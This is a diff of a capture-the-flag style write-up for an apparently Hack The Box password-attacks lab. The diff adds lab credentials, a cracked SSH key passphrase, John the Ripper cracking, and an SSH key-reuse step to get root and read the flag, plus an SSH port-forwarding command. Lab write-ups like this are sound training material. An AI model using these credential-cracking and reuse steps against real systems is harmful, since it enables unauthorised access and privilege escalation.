@@ -93,7 +93,6 @@ http://localhost:8080/cms
 
 ### Local Service Discovery  
 
->[Dynamic Port Forwarding with SSH and SOCKS Tunneling](https://academy.hackthebox.com/module/158/section/1426)  
 >`netstat` and `ss` commands to determine internal ports not accessible on victim from kali externally.   
 
 ```
@@ -119,9 +118,11 @@ select * from creds where name like 'dennis';
 
 ![SQL-Password-Attacks-Lab-Medium](/images/SQL-Password-Attacks-Lab-Medium.png)  
 
+>Crednetials for `dennis` and password is `7AUgWWQEiMPdqx`.  
+
 ## Lateral Movement  
 
->Logged in as `dennis` user with the discovered crednetials on the internal MySQL service, creds table.
+>Logged in as `dennis` user with the discovered credentials on the internal MySQL service, creds table.
 
 ```
 su dennis
@@ -140,6 +141,26 @@ john ssh.hash --wordlist=../mut_password.list
 ssh dennis@10.129.202.221 -i id_rsa_dennis.ssh
 ```
 
+>Password for the cracked id_rsa file is `P@ssw0rd12020!`.
 
+## Privilege Escalation  
 
+>Re using the SSH Key from Dennis in an SSH as root with found password for the id_rsa key file Reuse the Password `P@ssw0rd12020!`.  
 
+```
+ssh root@10.129.202.221 -i id_rsa_dennis.ssh
+id
+whoami
+
+cat /root/flag.txt
+```
+
+### Port Forwarding  
+
+>Extra: Did not use the port forwarding to privilege escalate, but did for enumeration internal services.  
+
+>[Dynamic Port Forwarding with SSH and SOCKS Tunneling](https://academy.hackthebox.com/module/158/section/1426)  
+
+```
+ssh -L 33060:localhost:33060 dennis@10.129.202.221 -i id_rsa_dennis.ssh
+```  
